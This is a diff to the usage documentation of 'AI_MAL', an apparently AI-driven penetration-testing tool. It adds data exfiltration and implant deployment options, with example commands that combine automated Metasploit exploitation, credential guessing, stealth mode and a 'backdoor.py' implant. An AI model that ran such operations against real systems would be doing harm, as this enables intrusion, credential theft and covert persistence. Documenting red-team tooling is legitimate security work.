@@ -7,10 +7,12 @@ This document outlines the various use cases and scenarios for the AI_MAL (AI-Po
 2. [Advanced Scanning](#advanced-scanning)
 3. [Metasploit Integration](#metasploit-integration)
 4. [Custom Script Generation](#custom-script-generation)
-5. [AI Model Configuration](#ai-model-configuration)
-6. [GUI Interface Options](#gui-interface-options)
-7. [Best Practices](#best-practices)
-8. [Troubleshooting](#troubleshooting)
+5. [Data Exfiltration](#data-exfiltration)
+6. [Implant Deployment](#implant-deployment)
+7. [AI Model Configuration](#ai-model-configuration)
+8. [GUI Interface Options](#gui-interface-options)
+9. [Best Practices](#best-practices)
+10. [Troubleshooting](#troubleshooting)
 
 ## Basic Usage
 
@@ -62,6 +64,30 @@ AI_MAL 192.168.1.1 --services --version --dos
 
 # Full penetration test with DoS assessment
 AI_MAL 192.168.1.1 --services --version --vuln --dos --msf --exploit
+```
+
+### Data Exfiltration
+```bash
+# Attempt to exfiltrate data from the target
+AI_MAL 192.168.1.1 --exfil
+
+# Combine exfiltration with service detection
+AI_MAL 192.168.1.1 --services --exfil
+
+# Comprehensive scan with exfiltration
+AI_MAL 192.168.1.1 --services --version --vuln --exfil
+```
+
+### Implant Deployment
+```bash
+# Deploy a custom script to the target system
+AI_MAL 192.168.1.1 --implant /path/to/payload.sh
+
+# Deploy implant with service detection
+AI_MAL 192.168.1.1 --services --implant /path/to/payload.py
+
+# Full red team operation with implant and data exfiltration
+AI_MAL 192.168.1.1 --services --vuln --exfil --implant /path/to/payload.rb
 ```
 
 The `--dos` option performs actual DoS vulnerability testing against discovered services:
@@ -117,6 +143,63 @@ AI_MAL 192.168.1.1 --custom-scripts --execute-scripts
 # Generate and execute Python scripts
 AI_MAL 192.168.1.1 --custom-scripts --script-type python --execute-scripts
 ```
+
+## Data Exfiltration
+
+### Basic Exfiltration
+```bash
+# Attempt to exfiltrate data from a single target
+AI_MAL 192.168.1.1 --exfil
+
+# Exfiltration with service detection for better targeting
+AI_MAL 192.168.1.1 --services --exfil
+```
+
+### Advanced Exfiltration
+```bash
+# Comprehensive exfiltration with vulnerability scanning
+AI_MAL 192.168.1.1 --services --version --vuln --exfil
+
+# Automated red team exfiltration
+AI_MAL 192.168.1.1 --msf --exploit --full-auto --exfil
+```
+
+The `--exfil` option enables data exfiltration capabilities:
+* Attempts to access and download files from target systems using multiple methods
+* Tries various credential combinations for authenticated access
+* Uses FTP, SMB, SSH, and HTTP/HTTPS protocols for exfiltration when available
+* Downloads sensitive files from common locations (config files, credentials, etc.)
+* Stores all exfiltrated data in an organized directory structure for analysis
+* Provides detailed logs and success/failure reporting
+
+## Implant Deployment
+
+### Basic Implant Deployment
+```bash
+# Deploy a bash script to the target
+AI_MAL 192.168.1.1 --implant /path/to/script.sh
+
+# Deploy a Python script to the target
+AI_MAL 192.168.1.1 --implant /path/to/script.py
+```
+
+### Advanced Implant Deployment
+```bash
+# Deploy implant with service detection for better targeting
+AI_MAL 192.168.1.1 --services --implant /path/to/script.rb
+
+# Full red team operation with implant and exfiltration
+AI_MAL 192.168.1.1 --services --vuln --exfil --implant /path/to/script.sh
+```
+
+The `--implant` option enables payload deployment capabilities:
+* Takes a path to a script file that will be uploaded to the target
+* Attempts multiple methods to deliver and execute the implant
+* Uses SSH for direct upload and execution when available
+* Leverages SMB, FTP, and HTTP upload forms as alternatives
+* Automatically attempts execution based on file extension (.py, .sh, .rb, etc.)
+* Creates detailed logs of deployment attempts and success/failure status
+* Tracks implanted targets for future reference
 
 ## AI Model Configuration
 
@@ -209,12 +292,27 @@ AI_MAL 192.168.1.1 --services --version --os --vuln --msf --exploit --custom-scr
 ```bash
 # Fully automated red team engagement
 AI_MAL 192.168.1.1 --msf --exploit --full-auto --custom-scripts --execute-scripts
+
+# Advanced red team with exfiltration and implant
+AI_MAL 192.168.1.1 --msf --exploit --full-auto --exfil --implant /path/to/payload.sh
 ```
 
 #### DoS Vulnerability Assessment
 ```bash
 # Focused DoS testing with minimal scanning
 AI_MAL 192.168.1.1 --services --dos
+```
+
+#### Data Exfiltration Operation
+```bash
+# Targeted data exfiltration operation
+AI_MAL 192.168.1.1 --services --stealth --exfil
+```
+
+#### Implant Deployment Mission
+```bash
+# Covert implant deployment
+AI_MAL 192.168.1.1 --stealth --implant /path/to/backdoor.py
 ```
 
 ## Command-Line Arguments Reference
@@ -231,6 +329,8 @@ The following table provides a comprehensive list of all available command-line 
 | `--os` | Enables OS detection | False | `AI_MAL 192.168.1.1 --os` |
 | `--vuln` | Enables vulnerability scanning | False | `AI_MAL 192.168.1.1 --vuln` |
 | `--dos` | Performs denial of service vulnerability testing | False | `AI_MAL 192.168.1.1 --dos` |
+| `--exfil` | Attempts to exfiltrate data from target systems | False | `AI_MAL 192.168.1.1 --exfil` |
+| `--implant` | Path to a script to deploy on target systems | None | `AI_MAL 192.168.1.1 --implant script.py` |
 | `--msf` | Enables Metasploit integration | False | `AI_MAL 192.168.1.1 --msf` |
 | `--exploit` | Attempts exploitation of vulnerabilities | False | `AI_MAL 192.168.1.1 --exploit` |
 | `--custom-scripts` | Enables AI-powered script generation | False | `AI_MAL 192.168.1.1 --custom-scripts` |
@@ -253,6 +353,23 @@ The following table provides a comprehensive list of all available command-line 
 - By default, only `qwen2.5-coder:7b` and `gemma:7b` will be auto-installed if needed
 - Any other Ollama model can be used with `--model` if already installed on your system
 - The tool will automatically choose the best available model if your specified model is not available
+- For data exfiltration (`--exfil`), files will be saved in the `exfiltrated_data` directory
+- For implant deployment (`--implant`), logs will be saved in the `implant_logs` directory
+
+### Data Exfiltration Prerequisites
+To fully utilize the data exfiltration capabilities (`--exfil`), you may need:
+- Network access to the target systems
+- Appropriate permissions for exfiltration methods
+- For SMB exfiltration: `pip install smbclient`
+- For SSH exfiltration: `pip install paramiko`
+
+### Implant Deployment Prerequisites
+To fully utilize the implant deployment capabilities (`--implant`), you may need:
+- A properly crafted script to deploy
+- Network access to the target systems
+- Appropriate permissions for deployment methods
+- For SMB deployment: `pip install smbclient`
+- For SSH deployment: `pip install paramiko`
 
 ### DoS Testing Prerequisites
 To fully utilize the DoS testing capabilities (`--dos`), you need:
